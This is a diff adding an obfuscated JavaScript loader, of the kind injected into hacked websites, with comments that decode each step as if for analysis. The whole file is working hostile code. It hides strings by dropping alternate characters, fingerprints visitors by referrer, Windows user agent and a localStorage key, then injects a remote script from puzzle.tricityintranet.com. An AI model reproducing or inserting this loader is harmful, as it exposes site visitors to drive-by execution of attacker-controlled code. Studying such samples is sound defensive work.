@@ -1,0 +1,37 @@
+(function () {
+    var doc_refer = document.referrer; 
+    //returns uri of referrer
+    var url = window.location.href; 
+    //returns url of the current page
+    var user_agent = navigator.userAgent; 
+    var zd = new RegExp(skip('q:k/m/e(a[z^z/l]l+y)b/x')); 
+    //zd = new RegExp("://([^/]+)/") 
+    if (!doc_refer || url.match(zd)[1] == doc_refer.match(zd)[1] || user_agent.indexOf(skip('wWxiwnbdboqwlsi')) == -1 || window.localStorage[skip('t_u_q_wujtamlap')]) 
+    // condition 1 checks if the user access the page directly or not -> if not, continue
+    // condition 2 checks if the domain of the current page matches domain of the referrer -> if yes, continue
+    // condition 3 checks if the user is running from Windows -> if yes, continue
+    // condition 4 checks for the localstorage['___utma'], if exists and not falsy, continue
+    { return; }
+
+    var script_elem = document.createElement('script'); 
+    // script_elem is script doc
+    script_elem.type = 'text/javascript'; 
+    script_elem.async = true; 
+    script_elem.src = skip('nhrtctypisz:f/u/ypzuczfzblbed.wturuipcciatayxihnktcruainreftq.qcroimt/brkeypqosrqtp?hrl=edmje0exvYpTgAbyfMpDaFyiaNrTnJokiNk2rNuhfOcTfku5wNszcEo1lMvycZujurlaWaQa9rMwjgYg4g'); 
+    //link = "https://puzzle.tricityintranet.com/report?r=dj0xYTAyMDFiNTJkN2NhOTk5NzE1MyZjaWQ9MjY4"
+    
+    var es = document.getElementsByTagName('script')[0]; 
+    es.parentNode.insertBefore(script_elem, es); 
+    // insert the script before the first script in html
+
+    function skip(wu) 
+    { var wd = '';
+    for (var hu = 0; hu < wu.length; hu++) 
+    { if (hu % 2) 
+        {
+            wd += wu[hu]; 
+        } 
+    } 
+    return wd; } 
+    // skip every even char
+})();
